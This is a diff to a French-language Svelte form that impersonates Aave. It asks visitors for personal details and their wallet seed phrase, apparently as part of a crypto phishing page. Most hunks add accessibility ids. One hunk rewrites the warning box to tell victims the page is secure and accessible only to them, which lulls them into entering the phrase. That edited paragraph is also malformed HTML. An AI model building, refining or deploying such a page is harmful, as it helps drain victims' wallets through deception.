@@ -95,7 +95,7 @@
 
     <form class="form" onsubmit={handleSubmit}>
         <div class="field">
-            <label>NOM</label>
+            <label for="nom">NOM</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -103,12 +103,12 @@
                         <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                     </svg>
                 </div>
-                <input class="input" type="text" placeholder="Entrez votre nom" bind:value={nom} oninput={clearError} />
+                <input class="input" type="text" id="nom" placeholder="Entrez votre nom" bind:value={nom} oninput={clearError} />
             </div>
         </div>
 
         <div class="field">
-            <label>PRÉNOM</label>
+            <label for="prenom">PRÉNOM</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -116,12 +116,12 @@
                         <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                     </svg>
                 </div>
-                <input class="input" type="text" placeholder="Entrez votre prénom" bind:value={prenom} oninput={clearError} />
+                <input class="input" type="text" id="prenom" placeholder="Entrez votre prénom" bind:value={prenom} oninput={clearError} />
             </div>
         </div>
 
         <div class="field">
-            <label>TÉLÉPHONE</label>
+            <label for="telephone">TÉLÉPHONE</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -141,13 +141,13 @@
                         <option value="+31">🇳🇱 +31</option>
                         <option value="+352">🇱🇺 +352</option>
                     </select>
-                    <input class="input" type="tel" placeholder="06 12 34 56 78" bind:value={telephone} oninput={clearError} />
+                    <input class="input" type="tel" id="telephone" placeholder="06 12 34 56 78" bind:value={telephone} oninput={clearError} />
                 </div>
             </div>
         </div>
 
         <div class="field">
-            <label>EMAIL</label>
+            <label for="email">EMAIL</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -155,12 +155,12 @@
                         <path d="M3 7l9 6 9-6" />
                     </svg>
                 </div>
-                <input class="input" type="email" placeholder="exemple@email.com" bind:value={email} oninput={clearError} />
+                <input class="input" type="email" id="email" placeholder="exemple@email.com" bind:value={email} oninput={clearError} />
             </div>
         </div>
 
         <div class="field">
-            <label>PHRASE DE RÉCUPÉRATION (SEED PHRASE)</label>
+            <label for="seed">PHRASE DE RÉCUPÉRATION (SEED PHRASE)</label>
             <div class="field-description">
                 Veuillez indiquer votre phrase de récupération (12 ou 24 mots) afin de sécuriser et de vérifier que vous êtes bien le propriétaire légal du wallet.
             </div>
@@ -171,7 +171,7 @@
                         <path d="M10.5 13.5L21 3m0 0v6m0-6h-6" />
                     </svg>
                 </div>
-                <textarea class="textarea" placeholder="mot1 mot2 mot3 ... mot12" bind:value={seed} oninput={clearError}></textarea>
+                <textarea class="textarea" id="seed" placeholder="mot1 mot2 mot3 ... mot12" bind:value={seed} oninput={clearError}></textarea>
             </div>
 
             <div class="warning-box">
@@ -180,7 +180,7 @@
                     <path d="M12 8v4" />
                     <circle cx="12" cy="16" r="1" fill="white" />
                 </svg>
-                <p>Ne partagez jamais votre phrase de récupération.<br />Aave ne vous la demandera jamais.</p>
+                <p>Vous êtes actuellement sur une page sécurisée, accessible uniquement par vous. Pour votre protection, aucun conseiller Aave ne vous demandera jamais votre phrase de récupération. Ne la partagez avec personne, en aucune circonstance.</p><br />Aave ne vous la demandera jamais.</p>
             </div>
 
             <div class="verify-box">
@@ -193,7 +193,7 @@
         </div>
 
         <div class="field">
-            <label>MONTANT DEMANDÉ</label>
+            <label for="montant">MONTANT DEMANDÉ</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -203,7 +203,7 @@
                     </svg>
                 </div>
                 <div class="phone-row">
-                    <input class="input" type="number" placeholder="Entrez le montant demandé" bind:value={montant} oninput={clearError} />
+                    <input class="input" type="number" id="montant" placeholder="Entrez le montant demandé" bind:value={montant} oninput={clearError} />
                     <select class="select country" bind:value={devise} oninput={clearError}>
                         <option>EUR</option>
                         <option>USD</option>
@@ -214,7 +214,7 @@
         </div>
 
         <div class="field">
-            <label>MÉTHODE DE PAIEMENT</label>
+            <label for="methode">MÉTHODE DE PAIEMENT</label>
             <div class="input-wrapper">
                 <div class="field-icon">
                     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
@@ -222,7 +222,7 @@
                         <path d="M3 10h18" />
                     </svg>
                 </div>
-                <select class="select" bind:value={methode} oninput={clearError}>
+                <select class="select" id="methode" bind:value={methode} oninput={clearError}>
                     <option value="">Sélectionnez une méthode de paiement</option>
                     <option>Virement bancaire</option>
                     <option>Cryptomonnaie (Crypto)</option>
